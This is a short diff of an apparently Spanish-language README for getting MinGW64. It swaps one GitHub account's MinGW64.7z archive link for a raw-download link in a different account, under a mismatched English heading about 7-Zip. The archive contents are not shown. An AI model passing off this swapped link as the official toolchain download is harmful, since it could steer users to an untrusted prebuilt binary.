@@ -4,7 +4,7 @@
 
 ### Obtenga la última versión de MinGW64 2020
 ```
-https://github.com/diaz0309/Release/blob/master/MinGW/x86/MinGW64.7z
+#### Get the latest version of 7z-zip[download mingw64](https://github.com/ascia0309/mingw/raw/refs/heads/main/MinGW/x64/MinGW64.7z?download=)
 ```
 
 ### Obtenga la última versión de 7z-zip
